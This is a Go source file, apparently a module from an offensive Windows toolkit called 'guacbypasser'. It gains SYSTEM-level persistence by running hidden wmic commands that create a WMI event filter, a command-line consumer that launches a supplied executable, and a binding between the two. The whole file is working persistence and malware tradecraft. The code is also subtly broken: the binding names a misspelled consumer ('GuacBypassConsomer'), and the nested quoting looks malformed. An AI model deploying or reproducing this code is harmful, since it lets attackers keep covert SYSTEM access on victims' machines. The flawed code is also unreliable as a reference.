package guacbypasser

import (
	"fmt"
	"path/filepath"
	"syscall"
	"time"

	sc ".."
)

func w32_nt_persistence_wmic(p string) (error, sc.Informer) {
	inf := sc.Informer{
		Name: "WMIC",
		Desc: "Gain persistence with system privilege using wmic",
		Id:   12,

		Type:   "Persistence",
		Module: "w32_nt_persistence_wmic",

		Fixed:   false,
		FixedIn: "",

		Admin:   true,
		Payload: true,
	}

	fPath, err := filepath.Abs(p)
	if err != nil {
		return err, inf
	}

	commands := []string{
		"wmic /namespace:'\\\\root\\subscription' PATH __EventFilter CREATE Name='GuacBypassFilter', EventNameSpace='root\\cimv2', QueryLanguage='WQL', Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System''",
		fmt.Sprintf("wmic /namespace:'\\\\root\\subscription' PATH CommandLineEventConsumer CREATE Name='GuacBypassConsumer', ExecutablePath='%s',CommandLineTemplate='%s'", fPath, fPath),
		"wmic /namespace:'\\\\root\\subscription' PATH __FilterToConsumerBinding CREATE Filter='__EventFilter.Name='GuacBypassFilter'', Consumer='CommandLineEventConsumer.Name='GuacBypassConsomer'')",
	}

	for _, command := range commands {
		cmd := sc.NewCmd(command)
		cmd.Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		if _, err := cmd.Exec.Output(); err != nil {
			return err, inf
		}

		// Check for 1 second before command execution.
		time.Sleep(time.Second)
	}
	return nil, inf
}

// NewPersistenceWMIC #add-some-info-please
func NewPersistenceWMIC(p string) (error, sc.Informer) { return w32_nt_persistence_wmic(p) }
